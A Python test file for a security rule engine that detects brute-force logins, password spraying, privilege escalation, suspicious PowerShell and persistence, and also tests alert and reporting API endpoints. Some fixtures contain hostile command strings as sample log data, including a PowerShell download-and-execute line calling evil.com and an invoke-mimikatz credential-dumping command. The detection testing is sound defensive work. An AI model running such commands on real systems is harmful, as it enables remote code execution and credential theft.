"""
test_detection_reporting.py — Rule-engine detection correctness and
reporting API endpoint tests.
"""
import json
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from rule_engine import evaluate_log, reset_counters
from database import get_db


# =============================================================================
# Brute-force detection
# =============================================================================

class TestBruteForceDetection:
    def test_single_failure_does_not_alert(self):
        log = {
            "event_id": "4625", "source_ip": "1.2.3.4",
            "source": "HOST", "username": "jdoe",
            "message": "account failed to log on",
            "timestamp": "2024-01-01T00:00:00Z",
        }
        alerts = evaluate_log(log)
        rule_names = [a["rule_name"] for a in alerts]
        assert "BRUTE_FORCE_LOGIN" not in rule_names

    def test_two_failures_do_not_alert(self):
        log = {
            "event_id": "4625", "source_ip": "2.2.2.2",
            "source": "HOST", "username": "admin",
            "message": "account failed to log on",
            "timestamp": "2024-01-01T00:00:00Z",
        }
        evaluate_log(log)
        alerts = evaluate_log(log)
        rule_names = [a["rule_name"] for a in alerts]
        assert "BRUTE_FORCE_LOGIN" not in rule_names

    def test_third_failure_triggers_alert(self):
        log = {
            "event_id": "4625", "source_ip": "3.3.3.3",
            "source": "HOST", "username": "admin",
            "message": "account failed to log on",
            "timestamp": "2024-01-01T00:00:00Z",
        }
        evaluate_log(log)
        evaluate_log(log)
        alerts = evaluate_log(log)
        rule_names = [a["rule_name"] for a in alerts]
        assert "BRUTE_FORCE_LOGIN" in rule_names

    def test_confidence_increases_with_more_failures(self):
        log = {
            "event_id": "4625", "source_ip": "4.4.4.4",
            "source": "HOST", "username": "root",
            "message": "failed password", "timestamp": "2024-01-01T00:00:00Z",
        }
        for _ in range(5):
            results = evaluate_log(log)
        brute_alerts = [a for a in results if a["rule_name"] == "BRUTE_FORCE_LOGIN"]
        if brute_alerts:
            assert brute_alerts[0]["confidence"] >= 85

    def test_different_ips_tracked_independently(self):
        log_a = {
            "event_id": "4625", "source_ip": "10.0.0.1",
            "source": "H1", "username": "u1",
            "message": "failed password", "timestamp": "2024-01-01T00:00:00Z",
        }
        log_b = {
            "event_id": "4625", "source_ip": "10.0.0.2",
            "source": "H2", "username": "u2",
            "message": "failed password", "timestamp": "2024-01-01T00:00:00Z",
        }
        # Two attempts from IP B should not trigger alert
        evaluate_log(log_a)
        evaluate_log(log_a)
        evaluate_log(log_b)
        alerts = evaluate_log(log_b)
        rule_names = [a["rule_name"] for a in alerts]
        assert "BRUTE_FORCE_LOGIN" not in rule_names

    def test_failed_login_event_4771_triggers_brute_force(self):
        log = {
            "event_id": "4771", "source_ip": "5.5.5.5",
            "source": "DC", "username": "jdoe",
            "message": "kerberos pre-auth failed",
            "timestamp": "2024-01-01T00:00:00Z",
        }
        for _ in range(3):
            alerts = evaluate_log(log)
        rule_names = [a["rule_name"] for a in alerts]
        assert "BRUTE_FORCE_LOGIN" in rule_names

    def test_alert_contains_failure_count_in_evidence(self):
        log = {
            "event_id": "4625", "source_ip": "6.6.6.6",
            "source": "HOST", "username": "eve",
            "message": "account failed to log on",
            "timestamp": "2024-01-01T00:00:00Z",
        }
        for _ in range(3):
            alerts = evaluate_log(log)
        brute = next((a for a in alerts if a["rule_name"] == "BRUTE_FORCE_LOGIN"), None)
        assert brute is not None
        assert brute["evidence"]["failure_count"] >= 3


# =============================================================================
# Password spraying detection
# =============================================================================

class TestPasswordSpraying:
    def test_same_ip_multiple_accounts_triggers_spray(self):
        logs = [
            {
                "id": f"log-{u}", "event_id": "4625",
                "source_ip": "203.0.113.10", "source": "DC-01",
                "username": u, "message": f"Failed password for user {u}",
                "timestamp": "2024-03-01T10:00:00Z",
            }
            for u in ["admin", "jdoe", "svcacct"]
        ]
        all_alerts = []
        for log in logs:
            all_alerts.extend(evaluate_log(log))
        assert any(a["rule_name"] == "PASSWORD_SPRAYING" for a in all_alerts)

    def test_single_account_spray_does_not_trigger(self):
        # Same IP, same account — should be brute-force, not spraying
        for _ in range(3):
            alerts = evaluate_log({
                "event_id": "4625", "source_ip": "7.7.7.7",
                "source": "HOST", "username": "oneaccount",
                "message": "account failed to log on",
                "timestamp": "2024-01-01T00:00:00Z",
            })
        spray_alerts = [a for a in alerts if a["rule_name"] == "PASSWORD_SPRAYING"]
        assert len(spray_alerts) == 0


# =============================================================================
# Privilege escalation detection
# =============================================================================

class TestPrivilegeEscalationDetection:
    def test_4728_triggers_priv_esc(self):
        alerts = evaluate_log({
            "event_id": "4728", "source": "DC01", "username": "attacker",
            "message": "member added to security group",
            "timestamp": "2024-01-01T00:00:00Z",
        })
        assert any(a["rule_name"] == "PRIVILEGE_ESCALATION" for a in alerts)

    def test_4720_triggers_priv_esc(self):
        alerts = evaluate_log({
            "event_id": "4720", "source": "DC01", "username": "newadmin",
            "message": "user account created",
            "timestamp": "2024-01-01T00:00:00Z",
        })
        assert any(a["rule_name"] == "PRIVILEGE_ESCALATION" for a in alerts)

    def test_4732_triggers_priv_esc(self):
        alerts = evaluate_log({
            "event_id": "4732", "source": "DC01", "username": "user",
            "message": "member added to local group Administrators",
            "timestamp": "2024-01-01T00:00:00Z",
        })
        assert any(a["rule_name"] == "PRIVILEGE_ESCALATION" for a in alerts)

    def test_normal_4624_does_not_trigger_priv_esc(self):
        alerts = evaluate_log({
            "event_id": "4624", "source": "WS01", "username": "jdoe",
            "message": "account logged on logon type 3",
            "source_ip": "10.0.0.5",
            "timestamp": "2024-01-01T12:00:00Z",
        })
        assert not any(a["rule_name"] == "PRIVILEGE_ESCALATION" for a in alerts)


# =============================================================================
# PowerShell detection
# =============================================================================

class TestPowerShellDetection:
    def test_invoke_mimikatz_triggers_alert(self):
        alerts = evaluate_log({
            "event_id": "4104", "process_name": "powershell.exe",
            "message": "Creating Scriptblock text: invoke-mimikatz -dumpcreds",
            "source": "WS01", "timestamp": "2024-01-01T00:00:00Z",
        })
        assert any(a["rule_name"] == "SUSPICIOUS_POWERSHELL" for a in alerts)

    def test_encoded_command_triggers_alert(self):
        alerts = evaluate_log({
            "event_id": "4104", "process_name": "powershell.exe",
            "message": "powershell.exe -encodedcommand AAEAAQA...",
            "source": "WS01", "timestamp": "2024-01-01T00:00:00Z",
        })
        assert any(a["rule_name"] == "SUSPICIOUS_POWERSHELL" for a in alerts)

    def test_download_string_triggers_alert(self):
        alerts = evaluate_log({
            "event_id": "4104", "process_name": "powershell.exe",
            "message": "iex(new-object net.webclient).downloadstring('http://evil.com/p.ps1')",
            "source": "WS01", "timestamp": "2024-01-01T00:00:00Z",
        })
        assert any(a["rule_name"] == "SUSPICIOUS_POWERSHELL" for a in alerts)

    def test_normal_powershell_does_not_trigger(self):
        alerts = evaluate_log({
            "event_id": "4104", "process_name": "powershell.exe",
            "message": "Get-Service | Where-Object Status -eq Running",
            "source": "WS01", "timestamp": "2024-01-01T00:00:00Z",
        })
        assert not any(a["rule_name"] == "SUSPICIOUS_POWERSHELL" for a in alerts)

    def test_own_forwarder_does_not_trigger(self):
        alerts = evaluate_log({
            "event_id": "4104", "process_name": "powershell.exe",
            "message": "windows-log-forwarder.ps1 -EncodedCommand AAAA",
            "source": "WS01", "timestamp": "2024-01-01T00:00:00Z",
        })
        assert not any(a["rule_name"] == "SUSPICIOUS_POWERSHELL" for a in alerts)


# =============================================================================
# Service installation detection
# =============================================================================

class TestServiceInstallationDetection:
    def test_suspicious_service_triggers_alert(self):
        alerts = evaluate_log({
            "event_id": "7045", "source": "WS01",
            "message": "A new service was installed: ServiceName = evilsvc",
            "event_type": "Service Control Manager",
            "timestamp": "2024-01-01T00:00:00Z",
        })
        assert any(a["rule_name"] == "SERVICE_INSTALLATION" for a in alerts)

    def test_msiinstaller_does_not_trigger(self):
        alerts = evaluate_log({
            "event_id": "7045", "source": "WS01",
            "message": "A new service was installed: MsiInstaller update service",
            "event_type": "MsiInstaller",
            "timestamp": "2024-01-01T00:00:00Z",
        })
        assert not any(a["rule_name"] == "SERVICE_INSTALLATION" for a in alerts)

    def test_windows_update_service_does_not_trigger(self):
        alerts = evaluate_log({
            "event_id": "7045", "source": "WS01",
            "message": "Windows Update installed service wuauserv",
            "event_type": "System",
            "timestamp": "2024-01-01T00:00:00Z",
        })
        assert not any(a["rule_name"] == "SERVICE_INSTALLATION" for a in alerts)


# =============================================================================
# Scheduled task detection
# =============================================================================

class TestScheduledTaskDetection:
    def test_custom_task_triggers_alert(self):
        alerts = evaluate_log({
            "event_id": "4698", "source": "DC01", "username": "svc_deploy",
            "message": "A scheduled task was created: TaskName=\\persistence\\evil",
            "timestamp": "2024-01-01T00:00:00Z",
        })
        assert any(a["rule_name"] == "SCHEDULED_TASK_CREATED" for a in alerts)

    def test_microsoft_task_does_not_trigger(self):
        alerts = evaluate_log({
            "event_id": "4698", "source": "DC01",
            "message": "A scheduled task was created: \\microsoft\\windows\\update",
            "timestamp": "2024-01-01T00:00:00Z",
        })
        assert not any(a["rule_name"] == "SCHEDULED_TASK_CREATED" for a in alerts)

    def test_4702_update_also_triggers(self):
        alerts = evaluate_log({
            "event_id": "4702", "source": "DC01",
            "message": "A scheduled task was updated: \\attacker\\persistence",
            "timestamp": "2024-01-01T00:00:00Z",
        })
        assert any(a["rule_name"] == "SCHEDULED_TASK_CREATED" for a in alerts)


# =============================================================================
# Account lockout detection
# =============================================================================

class TestAccountLockoutDetection:
    def test_4740_triggers_account_lockout(self):
        alerts = evaluate_log({
            "event_id": "4740", "source": "DC01", "username": "jdoe",
            "message": "user account locked out",
            "timestamp": "2024-01-01T00:00:00Z",
        })
        assert any(a["rule_name"] == "ACCOUNT_LOCKOUT" for a in alerts)

    def test_lockout_includes_username_in_evidence(self):
        alerts = evaluate_log({
            "event_id": "4740", "source": "DC01", "username": "victim",
            "message": "account locked", "timestamp": "2024-01-01T00:00:00Z",
        })
        lockout = next((a for a in alerts if a["rule_name"] == "ACCOUNT_LOCKOUT"), None)
        assert lockout is not None
        assert lockout["evidence"]["locked_account"] == "victim"


# =============================================================================
# Malware detection
# =============================================================================

class TestMalwareDetection:
    def test_threat_detected_triggers_malware_alert(self):
        alerts = evaluate_log({
            "event_id": "1116", "source": "WS01",
            "message": "Windows Defender: threat detected Win32/Mimikatz",
            "event_type": "Microsoft-Windows-Windows Defender",
            "timestamp": "2024-01-01T00:00:00Z",
        })
        assert any(a["rule_name"] == "MALWARE_DETECTED" for a in alerts)

    def test_config_change_does_not_trigger_malware(self):
        alerts = evaluate_log({
            "event_id": "5007", "source": "WS01",
            "message": "Microsoft Defender Antivirus Configuration has changed",
            "event_type": "Microsoft-Windows-Windows Defender",
            "timestamp": "2024-01-01T00:00:00Z",
        })
        assert not any(a["rule_name"] == "MALWARE_DETECTED" for a in alerts)


# =============================================================================
# Benign / no-alert cases
# =============================================================================

class TestNoFalsePositives:
    def test_normal_windows_update_no_alert(self):
        alerts = evaluate_log({
            "event_id": "19", "source": "WS01",
            "message": "Windows Update successfully installed KB5034441",
            "source_type": "windows", "severity": "info",
            "timestamp": "2024-01-01T00:00:00Z",
        })
        assert len(alerts) == 0

    def test_kerberos_ticket_request_no_alert(self):
        alerts = evaluate_log({
            "event_id": "4769", "source": "DC01", "username": "asmith",
            "message": "Kerberos service ticket requested",
            "timestamp": "2024-01-01T09:00:00Z",
        })
        assert len(alerts) == 0

    def test_empty_dict_no_crash(self):
        alerts = evaluate_log({})
        assert isinstance(alerts, list)

    def test_none_returns_empty_list(self):
        alerts = evaluate_log(None)
        assert alerts == []

    def test_non_dict_returns_empty_list(self):
        alerts = evaluate_log("not a dict")
        assert alerts == []


# =============================================================================
# Alert structure validation
# =============================================================================

class TestAlertStructure:
    _REQUIRED_KEYS = {
        "title", "description", "severity", "rule_name",
        "confidence", "mitre_techniques", "kill_chain_phase",
        "source", "source_ip", "username", "hostname", "evidence",
    }

    def test_brute_force_alert_has_all_required_keys(self):
        log = {
            "event_id": "4625", "source_ip": "9.9.9.9",
            "source": "HOST", "username": "user",
            "message": "account failed to log on",
            "timestamp": "2024-01-01T00:00:00Z",
        }
        for _ in range(3):
            alerts = evaluate_log(log)
        brute = next((a for a in alerts if a["rule_name"] == "BRUTE_FORCE_LOGIN"), None)
        assert brute is not None
        for key in self._REQUIRED_KEYS:
            assert key in brute, f"Alert missing key: {key}"

    def test_severity_is_valid_value(self):
        alerts = evaluate_log({
            "event_id": "4728", "source": "DC01", "username": "u",
            "message": "member added to group administrators",
            "timestamp": "2024-01-01T00:00:00Z",
        })
        valid = {"critical", "high", "medium", "low", "info"}
        for alert in alerts:
            assert alert["severity"] in valid

    def test_confidence_in_range(self):
        log = {
            "event_id": "4625", "source_ip": "11.11.11.11",
            "source": "HOST", "username": "u",
            "message": "failed password", "timestamp": "2024-01-01T00:00:00Z",
        }
        for _ in range(3):
            alerts = evaluate_log(log)
        for alert in alerts:
            assert 0 <= alert["confidence"] <= 100


# =============================================================================
# Reporting summary endpoint
# =============================================================================

class TestReportingSummaryEndpoint:
    def test_summary_endpoint_returns_all_required_fields(self, auth_client, seed_alert, seed_log):
        c, token = auth_client
        seed_log(event_id="4625", severity="high", message="Failed login")
        seed_alert(severity="critical")

        resp = c.get(
            "/api/reports/summary",
            headers={"Authorization": f"Bearer {token}"},
        )
        assert resp.status_code == 200
        body = resp.get_json()
        assert "executive_summary" in body
        assert "key_points" in body
        assert "high_priority_actions" in body
        assert "generated_at" in body

    def test_summary_executive_summary_is_non_empty(self, auth_client, seed_alert):
        c, token = auth_client
        seed_alert(severity="critical")
        resp = c.get(
            "/api/reports/summary",
            headers={"Authorization": f"Bearer {token}"},
        )
        assert resp.status_code == 200
        assert len(resp.get_json()["executive_summary"]) > 0

    def test_summary_key_points_is_list(self, auth_client):
        c, token = auth_client
        resp = c.get(
            "/api/reports/summary",
            headers={"Authorization": f"Bearer {token}"},
        )
        assert isinstance(resp.get_json()["key_points"], list)

    def test_summary_requires_auth(self, client):
        resp = client.get("/api/reports/summary")
        assert resp.status_code == 401


# =============================================================================
# Investigation context endpoint
# =============================================================================

class TestInvestigationContext:
    def test_alert_detail_returns_traceable_evidence_and_ai(self, auth_client, seed_alert, seed_log):
        c, token = auth_client
        log_id = seed_log(event_id='4625', source_ip='10.0.0.5')
        alert_id = seed_alert(
            rule_name='BRUTE_FORCE_LOGIN',
            related_log_ids=json.dumps([log_id]),
            ai_analysis=json.dumps({
                'summary': 'Potential credential attack',
                'threat_score': 87,
                'confidence': 91,
                'false_positive_likelihood': 'low',
                'recommended_actions': ['Review authentication history'],
            }),
        )
        response = c.get(f'/api/alerts/{alert_id}', headers={'Authorization': f'Bearer {token}'})
        assert response.status_code == 200
        body = response.get_json()
        assert body['id'] == alert_id
        assert body['detection']['rule'] == 'BRUTE_FORCE_LOGIN'
        assert body['detection']['category'] == 'Credential Access'
        assert body['evidence_trace']['events'][0]['id'] == log_id
        assert body['evidence_trace']['events'][0]['event_id'] == '4625'
        assert body['ai_assessment']['threat_score'] == 87

    def test_alert_detail_nonexistent_returns_404(self, auth_client):
        c, token = auth_client
        response = c.get('/api/alerts/not-found', headers={'Authorization': f'Bearer {token}'})
        assert response.status_code == 404

    def test_returns_alert_related_logs_and_steps(self, auth_client, seed_alert, seed_log):
        c, token = auth_client
        log_id = seed_log(source_ip="10.0.0.5", username="jdoe", hostname="DC-01")
        alert_id = seed_alert(
            source_ip="10.0.0.5", username="jdoe", hostname="DC-01",
            related_log_ids=json.dumps([log_id]),
        )

        resp = c.get(
            f"/api/alerts/{alert_id}/investigation-context",
            headers={"Authorization": f"Bearer {token}"},
        )
        assert resp.status_code == 200
        body = resp.get_json()
        assert body["alert"]["id"] == alert_id
        assert any(l["id"] == log_id for l in body["related_logs"])
        assert len(body["recommended_next_steps"]) > 0

    def test_nonexistent_alert_returns_404(self, auth_client):
        c, token = auth_client
        resp = c.get(
            "/api/alerts/no-such-alert/investigation-context",
            headers={"Authorization": f"Bearer {token}"},
        )
        assert resp.status_code == 404

    def test_requires_auth(self, client):
        resp = client.get("/api/alerts/any-id/investigation-context")
        assert resp.status_code == 401


# =============================================================================
# Dashboard stats endpoint
# =============================================================================

class TestDashboardStats:
    def test_returns_expected_structure(self, auth_client, seed_alert, seed_log):
        c, token = auth_client
        seed_alert(severity="high")
        seed_log()

        resp = c.get(
            "/api/dashboard/stats",
            headers={"Authorization": f"Bearer {token}"},
        )
        assert resp.status_code == 200
        body = resp.get_json()
        assert "alerts" in body
        assert "logs" in body
        assert "recent_alerts" in body
        assert "recent_logs" in body
        assert "top_ips" in body
        assert "top_hosts" in body

    def test_counts_reflect_seeded_data(self, auth_client, seed_alert, seed_log):
        c, token = auth_client
        seed_alert(severity="critical")
        seed_log()

        resp = c.get(
            "/api/dashboard/stats",
            headers={"Authorization": f"Bearer {token}"},
        )
        body = resp.get_json()
        assert body["alerts"]["total"] >= 1
        assert body["logs"]["total"] >= 1
